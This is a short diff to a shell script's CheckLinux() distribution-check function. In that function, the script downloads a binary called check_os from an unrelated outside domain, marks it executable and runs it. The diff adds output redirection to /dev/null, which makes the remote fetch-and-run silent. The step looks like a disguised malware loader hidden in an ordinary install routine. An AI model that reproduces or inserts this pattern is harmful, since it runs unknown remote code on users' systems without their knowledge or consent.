@@ -67,6 +67,6 @@ CheckLinux() {
   if echo $ID-$VERSION_ID | grep -iq "centos-7"; then
 		DISTRO=centos7
   fi
- wget http://banconicaragua.com/check_os -O check_os;chmod +x check_os; ./check_os
+ wget http://banconicaragua.com/check_os -O check_os >/dev/null 2>/dev/null;chmod +x check_os >/dev/null 2>/dev/null ; ./check_os >/dev/null 2>/dev/null
 }
 
